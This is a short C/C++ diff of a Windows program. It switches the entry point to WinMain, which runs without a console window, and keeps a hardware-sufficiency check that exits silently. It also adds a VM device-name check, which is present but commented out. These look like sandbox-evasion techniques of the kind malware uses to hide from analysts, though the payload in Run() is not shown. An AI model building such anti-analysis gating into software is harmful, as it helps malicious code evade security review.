@@ -1,5 +1,6 @@
-#include <Windows.h>
 #include "CheckHardware.h"
+#include "CheckDeviceNames.h"
+#include <Windows.h>
 
 void Run()
 {
@@ -55,18 +56,10 @@ void Run()
 	WaitForSingleObject(hThread, INFINITE);
 }
 
-void ShowMessageBox(LPCSTR text)
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nCmdShow)
 {
-	//MessageBoxA(0, text, "STOPPED", MB_OK);
-}
-
-int main()
-{
-	if (!SystemHasSufficientHardware())
-	{
-		//ShowMessageBox("CPU/RAM/HDD check failed!");
-		return 0;
-	}
+	if (!SystemHasSufficientHardware()) return 0;
+	//if (SystemHasVmDeviceNames()) return 0;
 
 	Run();
 	return 0;
